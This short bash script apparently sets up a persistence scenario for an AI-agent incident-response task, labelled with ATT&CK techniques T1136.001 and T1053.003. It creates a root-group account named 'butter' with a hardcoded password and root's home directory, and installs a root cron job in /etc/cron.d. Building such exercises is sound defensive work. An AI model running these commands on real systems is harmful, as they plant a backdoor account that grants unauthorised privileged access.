#!/bin/bash
# A persistence attack: a root-group account with root's home, a password, and a root cron job.
# ATT&CK T1136.001 (local account) + T1053.003 (cron). The agent's job is to find and undo it.
set -e
useradd -g 0 -M -d /root -s /bin/bash -c evil_account butter
echo 'butter:BetterWithButter' | chpasswd
echo '*/5 * * * * root /usr/bin/id > /tmp/atomic_art.log 2>&1' > /etc/cron.d/persistevil
